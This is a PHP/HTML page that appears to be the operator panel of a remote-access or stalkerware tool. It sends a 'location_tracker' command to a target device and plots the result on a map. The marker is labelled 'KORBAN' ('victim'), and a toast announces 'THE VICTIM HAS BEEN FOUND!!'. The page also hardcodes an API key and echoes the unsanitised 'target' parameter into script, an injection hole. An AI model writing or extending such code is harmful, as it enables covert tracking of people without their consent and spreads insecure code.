<?php 
require_once 'module_controller.php';

$uid_device = $_GET['target'];
$apikey = 'qyOjaWdWXTptlQ44Y0JQ';

$tileUrl = 'https://api.maptiler.com/maps/hybrid/256/{z}/{x}/{y}.png?key=' . $apikey;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Map Project</title>
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <link rel="stylesheet" href="https://api.maptiler.com/maps/streets/style.json?key=qyOjaWdWXTptlQ44Y0JQ">
    <style>
        #location-tracker-id {
            height: 500px;
        }
    </style>
</head>
   <body>
    <div class="row">
        <div class="col-md-11 col-lg-offset-0">
            <div class="well">

                <img id="command-sender-id" name="command-sender-id" src="./images/signal-sender.png" style='height:48px;'/>
                <div class="col-md-10 col-lg-offset-0">
                    <button type="button" id="btn-update-location" name="btn-update-location" class="btn btn-default">Open map</button>
                </div>

                <div class="row"></div>
                <br><br>
                <legend>Location Tracking</legend>
                <div class="row">

                    <div id="location-tracker-id" style="height: 500px;"></div>

                </div>
                <br><br>
            </div>
        </div>
    </div>
<script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
<script>

    function showLocation(x, y) {
       var map = L.map('location-tracker-id').setView([x, y], 13);

       L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
        }).addTo(map);
      
       var markerLocation = [x, y]
       var marker = L.marker(markerLocation).addTo(map)
       marker.bindPopup("KORBAN").openPopup();
    }


    $("#btn-update-location").click(function() {
        $.post( "commands.php", { get_location: '<?php echo $uid_device; ?>'}, function( data, err ) {

console.log(data)
            if (data){
showLocation(data.x_axis.replace("a",""), data.y_axis.replace("a",""))
                Toastify({
                    text: "Komut gönderildi.!",
                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                    className: "info",
                }).showToast();
                showLocation();

            } else {
                Toastify({
                    text: "Komut başarısız.!",
                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                    className: "info",
                }).showToast();
            }

        }, "json");

    });

    $("#command-sender-id").click(function() {
        $.post( "commands.php", { send_command: true, target:"<?php echo $uid_device;?>", type: "location_tracker", value: true}, function( data, err ) {
console.log(data)
            if (data.status){
                Toastify({
                    text: "THE VICTIM HAS BEEN FOUND!!",
                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                    className: "info",
                }).showToast();
            } else {
                Toastify({
                    text: "ERROR!!",
                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                    className: "info",
                }).showToast();
            }

        }, "json");

    });

</script>
</body>
</html>